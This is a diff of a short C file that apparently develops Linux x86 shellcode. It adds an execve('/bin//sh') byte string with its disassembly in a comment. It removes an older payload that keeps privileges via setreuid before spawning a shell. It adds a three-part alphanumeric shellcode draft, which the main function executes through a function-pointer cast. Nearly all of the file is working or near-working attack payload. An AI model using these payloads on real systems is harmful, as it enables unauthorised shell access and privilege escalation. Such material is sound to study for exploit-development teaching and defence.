@@ -1,5 +1,8 @@
 /*
 
+Workable Shellcode
+char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
 08049640 <shellcode>:
 
  8049653:   31 c0                   xor    %eax,%eax
@@ -14,12 +17,15 @@
  8049668:   b0 0b                   mov    $0xb,%al
  804966a:   cd 80                   int    $0x80
 
-*/
 
-/*
 */
 
 int main(void) {
-    char *shellcode = "\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+    // P1, P2, ...: see DRAFT.md
+    char *shellcode = "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPY"   // P1
+                      "PZ"                                                      // P2    
+                      "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH";               // P3
+
     (*(void(*)()) shellcode)();
 }
